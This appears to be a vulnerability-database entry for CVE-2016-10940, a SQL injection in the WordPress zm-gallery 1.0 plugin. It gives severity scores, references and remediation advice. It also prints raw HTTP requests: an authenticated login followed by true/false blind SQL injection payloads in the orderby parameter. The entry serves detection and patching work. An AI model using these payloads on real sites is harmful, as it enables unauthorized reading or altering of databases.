---
layout: "post"
cve_id: "CVE-2016-10940"
title: "WordPress zm-gallery plugin 1.0 SQL Injection"
pcap: true
pcap_path: "/pcaps/2016/CVE-2016-10940.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2016/CVE-2016-10940.yaml"
author: "cckuailong,daffainfo"
severity: "high"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary SQL queries, potentially leading to unauthorized access, data leakage, or data manipulation.
"
remediation: "Update to the latest version of the zm-gallery plugin or apply the patch provided by the vendor.
"
reference:
  - "https://wpscan.com/vulnerability/c0cbd314-0f4f-47db-911d-9b2e974bd0f6"
  - "https://lenonleite.com.br/en/2016/12/16/zm-gallery-1-plugin-wordpress-blind-injection/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2016-10940"
  - "http://lenonleite.com.br/en/2016/12/16/zm-gallery-1-plugin-wordpress-blind-injection/"
  - "https://wordpress.org/plugins/zm-gallery/#developers"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 7.2
  cve-id: "CVE-2016-10940"
  cwe-id: "CWE-89"
  epss-score: 0.14101
  epss-percentile: 0.94087
  cpe: "cpe:2.3:a:zm-gallery_project:zm-gallery:1.0:*:*:*:*:wordpress:*:*"
metadata:
  max-request: 3
  vendor: "zm-gallery_project"
  product: "zm-gallery"
  framework: "wordpress"
tags:
  - "cve"
  - "cve2016"
  - "wpscan"
  - "sqli"
  - "wp"
  - "wordpress"
  - "wp-plugin"
  - "authenticated"
  - "zm-gallery_project"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
zm-gallery plugin 1.0 for WordPress is susceptible to SQL injection via the order parameter.

## üåê HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362
Connection: close
Content-Length: 53
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Origin: /
Accept-Encoding: gzip

log=gKDYsq&pwd=6qhhT2Ix&wp-submit=Log+In&testcookie=1
```

```nohighlight
GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7422)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (watchTowr; Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7421)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```


